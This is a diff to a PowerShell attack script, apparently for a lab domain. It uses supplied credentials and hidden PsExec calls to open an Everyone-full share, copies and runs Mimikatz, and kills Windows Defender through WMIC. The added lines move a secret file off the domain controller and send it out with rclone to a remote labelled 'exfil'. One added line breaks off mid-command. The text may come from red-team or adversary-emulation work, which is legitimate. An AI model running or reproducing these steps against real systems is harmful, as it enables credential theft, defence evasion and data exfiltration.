@@ -26,7 +26,7 @@ Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden
 
 "Copy Mimikatz"
-net use z: \\defender-win10\\exploit
+net use z: \\defender-win10\exploit
 xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
 
 "Run Mimikatz"
@@ -44,4 +44,12 @@ $admincred = New-Object -TypeName System.Management.Automation.PSCredential -Arg
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c wmic /node:dcontent proces call where `"name='Windows Defender'`" call Terminate " -WindowStyle Hidden
 
 "PsExec To the DC"
-Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe "  -WindowStyle Hidden
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe /c net share exploit=c:\exploit /
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent Move-Item –Path c:\secret_data\secret_data.txt -Destination c:\exploit\ "  -WindowStyle Hidden
+
+"Exfil"
+net use w: \\dcontent\exploit
+xcopy  w:\secret_data.txt c:\exploit\ /E /y
+rclone copy c:\exploit\secret_data.txt remote:exfil
+
